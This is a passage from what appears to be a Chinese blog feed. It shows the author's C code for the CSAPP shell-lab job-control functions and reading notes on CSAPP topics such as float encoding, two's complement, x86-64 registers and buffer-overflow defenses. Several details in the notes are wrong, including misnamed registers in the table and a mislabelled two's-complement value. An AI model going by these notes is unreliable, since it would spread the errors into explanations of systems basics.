class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> builtin cmd，这个书上有</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>))<span class="comment">/* 无视单独的&amp; */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))&#123;</span><br><span class="line">        <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;<span class="comment">/* 查看当前有多少在后台运行的命令 */</span></span><br><span class="line">        <span class="built_in">listjobs</span>(jobs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接着实现do_bgfg</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fg将后台中的命令调至前台继续运行</span></span><br><span class="line"><span class="comment">//bg将一个在后台暂停的命令，变成继续执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)&#123;<span class="comment">/* 如果没给pid */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>, &amp;id) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        job = <span class="built_in">getjobpid</span>(jobs, id);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No such job\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">kill</span>(-(job-&gt;pid), SIGCONT);</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">kill</span>(-(job-&gt;pid), SIGCONT);</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后一个信号SIGCHLD</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个子进程停止或终止</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span>((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) </span><br><span class="line">    <span class="comment">/* 如果当前进程都没有停止或终止，返回0。否则返回子进程pid */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">WIFEXITED</span>(status))<span class="comment">/* 正常退出 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">deletejob</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">WIFSIGNALED</span>(status)) <span class="comment">/* 未捕获的信号终止 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, <span class="built_in">WTERMSIG</span>(status));</span><br><span class="line">            <span class="built_in">deletejob</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">WIFSTOPPED</span>(status))<span class="comment">/* 当前进程是停止的 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, <span class="built_in">WSTOPSIG</span>(status));</span><br><span class="line">            job-&gt;state= ST;</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> bg;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> array[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> *buf = array;</span><br><span class="line"><span class="keyword">char</span> *argv[MAXARGS];</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">sigset_t</span> mask_one, prev, mask_all;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">bg = <span class="built_in">parseline</span>(buf, argv);<span class="comment">/* 解析以空格分隔的命令行参数 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argv[<span class="number">0</span>] == <span class="literal">NULL</span>)<span class="comment">/* 没东西直接返回 */</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">builtin_cmd</span>(argv))&#123;<span class="comment">/* 如果不是内置命令，进入if循环 */</span></span><br><span class="line"><span class="built_in">sigemptyset</span>(&amp;mask_one);</span><br><span class="line"><span class="built_in">sigaddset</span>(&amp;mask_one, SIGCHLD);</span><br><span class="line"><span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line"><span class="comment">/* 防止addjob和deletejob竞争，需要先阻塞SIGCHLD信号 */</span></span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_one, &amp;prev);</span><br><span class="line"><span class="comment">/* 如果不是内置命令，则fork一个子进程，并execve程序 */</span></span><br><span class="line"><span class="keyword">if</span>((pid = fork()) == <span class="number">0</span>)&#123;<span class="comment">/* 子进程中 */</span></span><br><span class="line"><span class="built_in">setpgid</span>(<span class="number">0</span>, <span class="number">0</span>);<span class="comment">/* 将子进程放入新的进程组，防止和shell冲突 */</span></span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">execve</span>(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 对全局数据结构jobs进行访问时，要阻塞所有信号 */</span></span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">addjob</span>(jobs, pid, bg?BG:FG, buf);</span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(bg)&#123;<span class="comment">//后台作业</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, <span class="built_in">pid2jid</span>(pid), pid, buf);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//前台作业</span></span><br><span class="line"><span class="built_in">waitfg</span>(pid);<span class="comment">//需要等待前台作业完成</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年2月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[读书笔记] csapp</title>
      <link href="/2021/01/31/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-csapp/"/>
      <url>/2021/01/31/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-csapp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>暂时没想到写啥(x</p><h1 id="0x01-计算机系统漫游"><a href="#0x01-计算机系统漫游" class="headerlink" title="0x01 计算机系统漫游"></a>0x01 计算机系统漫游</h1><ol><li><p>计算机系统是由硬件和系统软件组成</p></li><li><p>编译和解释的区别：</p></li></ol><p>编译程序(Complier)：将高级语言源程序转换为机器级目标程序，执行时只要启动目标程序即可。<br>解释程序(Interpreter)：将高级语言语句逐条翻译成机器指令并立即执行，不生成目标文件。</p><ol start="3"><li>程序可以被其他程序翻译为不同的格式：</li></ol><ul><li>预处理阶段：预处理器根据以字符<code>#</code>开头的命令，修改原始的C程序。以<code>.i</code>作为文件扩展名；</li><li>编译阶段：编译器将<code>.i</code>文件翻译成汇编<code>.s</code>文件；</li><li>汇编阶段：汇编器将<code>.s</code>文件翻译成机器语言指令<code>.o</code>；</li><li>链接阶段：有些程序调用了别的库中的函数，链接器负责将别的库合并到我们的程序。</li></ul><p><img src="https://i.loli.net/2021/01/31/en9YCiwGvulbXSa.png" alt="image-20210131224820506"></p><ol start="4"><li>系统的硬件组成：</li></ol><ul><li>总线：在各个部件中传输数据时用的管道;</li><li>I/O设备：输入输出设备，通过一个控制器或适配器与I/O总线相连；</li><li>主存：临时存储设备，在处理器执行程序时，用来暂存程序处理的数据；</li><li>处理器：中央处理单元(CPU)，简称处理器，是执行存储在主存中指令的引擎。</li></ul><p><img src="https://i.loli.net/2021/02/03/8ceDNofW76wQgvp.png"></p><ol start="5"><li><p>高速缓存：处理器的运行速度很快，但数据从主存运送到CPU里却相当的慢。这其中速度可能相差百倍以上，大大拖累了CPU的速度。针对这种处理器与主存之间的差异，系统设计者引入了更小更快的存储设备——高速缓存存储器。</p></li><li><p>进程：进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。并发运行，则是说一个进程的指令和另一个进程的指令是交错执行的。</p></li><li><p>线程：进程由线程组成，多线程之间比多进程之间更容易共享数据。线程一般来说也比进程更高效。</p></li><li><p>虚拟内存：虚拟内存为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致的，称为虚拟地址空间。</p></li></ol><p><img src="https://i.loli.net/2021/02/03/2JO3xK5Lqh9Svar.png" alt="image-20210203225412444"></p><ol start="9"><li>文件：每个I/O设备，包括磁盘、键盘、显示器，甚至网络都可以看成是文件。</li></ol><h1 id="0x02-信息的表示和处理"><a href="#0x02-信息的表示和处理" class="headerlink" title="0x02 信息的表示和处理"></a>0x02 信息的表示和处理</h1><h2 id="1-字节顺序"><a href="#1-字节顺序" class="headerlink" title="1.字节顺序"></a>1.字节顺序</h2><p>Suppose the variable x of type int and at address 0x100 has a hexadecimal value of 0x01234567 . The ordering of the bytes within the address range 0x100 through 0x103 depends on the type of machine:</p><p><img src="https://i.loli.net/2021/02/03/jrbWDHmcu5E3AVS.png" alt="image-20210203233606025"></p><h2 id="2-浮点数"><a href="#2-浮点数" class="headerlink" title="2.浮点数"></a>2.浮点数</h2><p><strong>浮点数是如何存储到内存中的：</strong></p><p>float的存储方式</p><p><a href="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png"><img src="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png" alt="image-20200828213506250.png"></a></p><ol><li>先将这个浮点数的绝对值值化为二进制；</li><li>将这个二进制数的小数点左移或者右移n位，直到小数点移动到前面只剩一个1；</li><li>从小数点右边第一位开始数出二十三位数字放入第22到第0位；</li><li>如果实数是正的，则在第31位放入0，否则放入1；</li><li>如果n是左移得到的，说明指数是正的，第30位放入1。如果n是右移得到的或n=0，则在第30位放入0；</li><li>将n减去1后化为二进制，把值去掉第一位放入第29到第23位（7位）。</li></ol><p>因为float尾数部分只有24位，所以能精确到小数点后六位。不存在无符号float，因为第一位就是符号位了。</p><p>double是64位的，8个字节（float是4个字节）</p><p><strong>如何把浮点数转换为二进制：</strong></p><p>例：8.25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">整数部分转换：</span><br><span class="line">8/2 = 40</span><br><span class="line">4/2 = 20</span><br><span class="line">2/2 = 10</span><br><span class="line">1/2 = 0 1</span><br><span class="line">1000</span><br><span class="line">小数部分转换：</span><br><span class="line">0.25*2 = 0.50</span><br><span class="line">0.5*2  = 1.01</span><br><span class="line">1000.01</span><br></pre></td></tr></table></figure><p>8.25可以用二进制表示为1000.01</p><p>但如果是8.4就会进入死循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.4 * 2 = 0.80</span><br><span class="line">0.8 * 2 = 1.61</span><br><span class="line">0.6 * 2 = 1.21</span><br><span class="line">0.2 * 2 = 0.40</span><br></pre></td></tr></table></figure><p>这时候需要精确位数。</p><p>接着8.25继续，将小数点右移或者左移</p><p>1.00001 * 2^3</p><p>然后把00001存到尾数部分，后面跟着步骤来。</p><table><thead><tr><th align="left">31符号位sign</th><th align="left">23~30指数部分exp</th><th align="left">0~22位数部分frac</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">10000010</td><td align="left">00001000000000000000000</td></tr></tbody></table><p>所以在内存中存入的值是41040000。</p><p>如果是-8.25，也只需要变符号位</p><table><thead><tr><th align="left">31符号位sign</th><th align="left">23~30指数部分exp</th><th align="left">0~22位数部分frac</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">10000010</td><td align="left">00001000000000000000000</td></tr></tbody></table><p>在内存中存入的值就是c1040000。</p><p><strong>浮点数精度问题：</strong></p><p>当输入的浮点数是一个不可表示的数时，机器会将其转换为最邻近的可表示数。</p><p>例如61.419997和61.419999都会被转换为61.419998。</p><p><strong>浮点数的值有4种不同的情况：</strong></p><ol><li><p>当exp≠0xFF，也≠0x00时，为规格化的；</p></li><li><p>当exp = 0x00 时，为非规格化的（表示那些接近0.0的数）。当exp=0且frac=0时，表示<code>±0.0</code>；</p></li><li><p>当exp = 0xFF 时，若frac全为0，表示<code>±∞</code>；若frac不全为0，则表示<code>NaN</code>(Not A Number，例如根号-1这些不存在的数字).</p></li></ol><p>浮点数因为精度有限，所有存在舍入问题：就近舍入（round-to-nearest）和向偶数舍入（round-to-even）.</p><h2 id="3-无符号数与有符号数"><a href="#3-无符号数与有符号数" class="headerlink" title="3.无符号数与有符号数"></a>3.无符号数与有符号数</h2><p>若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数。</p><p>有符号数就算最高位表示符号，其他位置表示数值大小；无符号数就是所有位都表示数的大小。</p><p>一个字节可以表达的数：<br>00000000-11111111(0-255)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000 0001 1</span><br><span class="line">+1111 1111-1</span><br><span class="line">________________</span><br><span class="line">  1 0000 0000 0</span><br></pre></td></tr></table></figure><p>因为如果在计算机内部，这个数是8个bit的，那么多出来的数字就会被丢掉<br>所以这里-1为1111 1111</p><p>1111 1111被当作纯二级制看待的时候，是255。被当作补码看待时是-1</p><blockquote><p>(1)0000 0000 - 0000 0001 = 1111 1111</p><p><strong>对于-a，其补码就是0-a，实际是2的n次方-a，n是这种类型的位数</strong></p></blockquote><ul><li>补码的意义就是拿补码和原码可以加出一个溢出的”零”</li></ul><h3 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h3><p>原码就是第一位表示符号，其余位置表示值</p><p>1000 0001</p><p>0000 0001</p><h3 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h3><p>反码就是在其原码的基础上，符号位不变，其余位取反。正数的反码是其本身</p><p>1000 0001 反码 -&gt; 1111 1110</p><p>0000 0001 反码 -&gt; 0000 0001</p><h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>整数的补码就是其本身</p><p>负数的补码是在其反码的基础上加1</p><p>1000 0001 反码 -&gt; 1111 1110 补码 -&gt; 1111 1111 -127</p><p>0000 0001 反码 -&gt; 0000 0001 补码 -&gt; 0000 0001 1</p><h2 id="4-编译器处理常量时的默认类型"><a href="#4-编译器处理常量时的默认类型" class="headerlink" title="4.编译器处理常量时的默认类型"></a>4.编译器处理常量时的默认类型</h2><p><a href="https://i.loli.net/2021/02/01/mxFrDXglpEUt4sf.png"><img src="https://i.loli.net/2021/02/01/mxFrDXglpEUt4sf.png" alt="img"></a></p><ul><li>所以在32位C90标准下系统中，<code>-2147483648 &gt; 2147483647</code>，因为<code>2147483648</code>会变成unsigned类型（负号是另外处理的）。</li><li>但是如果定义了<code>int i=-2147483648;</code>，<code>i</code>就会小于<code>2147483647</code>。这是因为<code>i</code>变成了long类型。</li><li>如果写成<code>-2147483647-1 &lt; 2147483647</code>，因为-2147483647是属于有符号数，这个式子可以理解为一个有符号数减掉有符号数，所以最后会按照int类型比较。但是如果写成<code>-2147483648</code>加减，则会按照无符号数来计算。</li></ul><h1 id="0x03-程序的机器级表示"><a href="#0x03-程序的机器级表示" class="headerlink" title="0x03 程序的机器级表示"></a>0x03 程序的机器级表示</h1><h2 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h2><p>一个x86-64的中央处理单元包含16个存储64位值的通用寄存器</p><table><thead><tr><th>63</th><th>31</th><th>15</th><th>7</th><th>0</th></tr></thead><tbody><tr><td>%rax</td><td>%eax</td><td>%ax</td><td>%axl</td><td>返回值</td></tr><tr><td>%rbx</td><td>%ebx</td><td>%bx</td><td>%bxl</td><td>被调用者保存</td></tr><tr><td>%rcx</td><td>%ecx</td><td>%cx</td><td>%cxl</td><td>第4个参数</td></tr><tr><td>%rdx</td><td>%edx</td><td>%dx</td><td>%dxl</td><td>第3个参数</td></tr><tr><td>%rsi</td><td>%esi</td><td>%si</td><td>%sil</td><td>第2个参数</td></tr><tr><td>%rdi</td><td>%edi</td><td>%di</td><td>%dil</td><td>第1个参数</td></tr><tr><td>%rdp</td><td>%edp</td><td>%dp</td><td>%dpl</td><td>被调用者保存</td></tr><tr><td>%rsp</td><td>%esp</td><td>%sp</td><td>%spl</td><td>栈指针</td></tr><tr><td>%r8</td><td>%r8d</td><td>%r8w</td><td>%r8b</td><td>第5个参数</td></tr><tr><td>%r9</td><td>%r9d</td><td>%r9w</td><td>%r9b</td><td>第6个参数</td></tr><tr><td>%r10</td><td>%r10d</td><td>%r10w</td><td>%r10b</td><td>调用者保存</td></tr><tr><td>%r11</td><td>%r11d</td><td>%r11w</td><td>%r11b</td><td>调用者保存</td></tr><tr><td>%r12</td><td>%r12d</td><td>%r12w</td><td>%r12b</td><td>被调用者保存</td></tr><tr><td>%r13</td><td>%r13d</td><td>%r13w</td><td>%r13b</td><td>被调用者保存</td></tr><tr><td>%r14</td><td>%r14d</td><td>%r14w</td><td>%r14b</td><td>被调用者保存</td></tr><tr><td>%r15</td><td>%r15d</td><td>%r15w</td><td>%r15b</td><td>被调用者保存</td></tr></tbody></table><ol><li>传送指令的两个操作数不能都指向内存位置</li><li>64位和32位传递参数的方式不同：32位的将参数入栈来传递参数，64位的使用寄存器进行传递参数，用来传递参数的寄存器为rdi,rsi,rdx,rcx,r8,r9,这六个寄存器分别用来存储第一至第六个参数，如果参数多余6个会先将后面的参数先入栈，前六个参数放在对应的寄存器中。</li></ol><h2 id="2-缓冲区溢出"><a href="#2-缓冲区溢出" class="headerlink" title="2.缓冲区溢出"></a>2.缓冲区溢出</h2><p>缓冲区溢出攻击给计算机系统造成了许多麻烦，现代的编译器和操作系统实现了很多机制，以避免遭受这样的攻击。</p><p><strong>栈随机化</strong>：栈随机化使栈的位置在程序每次运行时都发生变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。</p><p><strong>栈破坏检测</strong>：最近的GCC版本在产生的代码加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</p><p><strong>限制可执行代码区域</strong>：最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p><h1 id="0x04-处理器体系结构"><a href="#0x04-处理器体系结构" class="headerlink" title="0x04 处理器体系结构"></a>0x04 处理器体系结构</h1><p>本章定义了一个指令集Y86-64，主要介绍了处理器硬件的设计。<br>一个处理器支持的指令和指令的字节级编码被称为它的<strong>指令集体系结构</strong>(Instruction-Set Architecture, ISA)。不同处理器有不同ISA，一个程序编译后在一种机器上运行，就不能在另一种机器上运行。</p><p>流水线：CPU流水线技术是一种将指令分解为多步，并让不同指令的各布操作重叠，从而实现几条指令并行处理，以加速程序运行速度过程的技术。</p><h2 id="1-Y86指令集体系结构"><a href="#1-Y86指令集体系结构" class="headerlink" title="1.Y86指令集体系结构"></a>1.Y86指令集体系结构</h2><h3 id="指令编码"><a href="#指令编码" class="headerlink" title="指令编码"></a>指令编码</h3><p><img src="https://i.loli.net/2021/04/01/EM3LF7bKNSnYgoG.png" alt="image-20210401183233949"></p><blockquote><p>PC存放当前正在执行指令的地址；内存存放着程序和数据；Stat是状态码，它表示程序执行的总体状态，它会指示是正常运行还是出现了某种异常。</p></blockquote><p><img src="https://i.loli.net/2021/04/01/QdyXFS4zlf2E3VU.png"></p><p><img src="https://i.loli.net/2021/04/01/stcqw7Az4MYnFVf.png" alt="image-20210401200654057"></p><blockquote><p>rrmovq指令是无条件传送</p></blockquote><p>寄存器标识符：</p><p><img src="https://i.loli.net/2021/04/01/TPoner2ldO1gQCZ.png" alt="image-20210401201421875"></p><p>指令集的一个重要性质就是字节编码必须有唯一的解释。</p><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>此处的异常指的是状态码Stat，它描述程序执行的状态。</p><p><img src="https://i.loli.net/2021/04/01/l9DU72xJ153LdcW.png" alt="image-20210401211504591"></p><h1 id="0x05-优化程序性能"><a href="#0x05-优化程序性能" class="headerlink" title="0x05 优化程序性能"></a>0x05 优化程序性能</h1><h1 id="0x07-链接"><a href="#0x07-链接" class="headerlink" title="0x07 链接"></a>0x07 链接</h1><h2 id="1-静态链接"><a href="#1-静态链接" class="headerlink" 